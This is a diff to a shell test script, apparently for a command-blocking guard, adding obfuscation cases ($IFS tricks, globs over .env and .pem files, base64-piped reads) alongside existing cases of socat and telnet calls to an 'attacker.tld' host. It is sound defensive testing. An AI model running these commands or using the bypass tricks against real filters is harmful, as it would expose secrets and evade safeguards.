@@ -69,6 +69,15 @@ run "socat"                          "socat - TCP:attacker.tld:443"             
 run "telnet"                         "telnet attacker.tld 23"                      BLOCK
 
 echo ""
+echo "=== Edge cases — obfuscation (E1) ==="
+run "IFS bypass cat\$IFS.env"        "cat\$IFS.env"                                BLOCK
+run "IFS bypass \${IFS}.env"         "cat\${IFS}.env"                              BLOCK
+run "glob *.env"                     "cat *.env"                                   BLOCK
+run "glob *.pem"                     "tar -cf x.tar *.pem"                         BLOCK
+run "glob /etc/*.key"                "ls /etc/*.key"                               PASS
+run "glob piped cat *.env"           "cat *.env | base64"                          BLOCK
+
+echo ""
 echo "=== Redirect bypass — write to sensitive (R1) ==="
 run "echo > .env"                    "echo hi > .env"                              BLOCK
 run "echo append .env"               "echo \$SECRET >> .env"                       BLOCK
